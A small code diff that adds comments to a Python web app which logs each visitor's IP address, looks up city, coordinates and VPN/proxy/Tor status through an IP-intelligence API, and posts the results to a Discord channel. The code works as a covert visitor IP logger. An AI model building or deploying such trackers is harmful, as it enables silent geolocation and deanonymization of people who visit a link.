@@ -38,6 +38,7 @@ def send_ip_to_discord(ip, data):
     if channel:
         # Use the bot's API to send the message
         asyncio.run_coroutine_threadsafe(
+            # Format the message with the IP and location data
             channel.send(f"New visitor IP: `{ip}`\n{data["location"]["city"]}, {data["location"]["region"]}\nIs VPN: {data["security"]["is_vpn"]}\nIs Proxy: {data["security"]["is_proxy"]}\nIs Tor: {data["security"]["is_tor"]}\nIs Mobile: {data["security"]["is_mobile"]}\nLatitude: {data["location"]["latitude"]}\nLongitude: {data["location"]["longitude"]}"),
             bot.loop
         )
@@ -48,6 +49,7 @@ def send_ip_to_discord(ip, data):
 def get_ip():
     forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = forwarded.split(',')[0].strip()
+    # Make a request to the Abstract API to get IP intelligence data
     response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
     data = json.loads(response.text)
     send_ip_to_discord(ip, data)
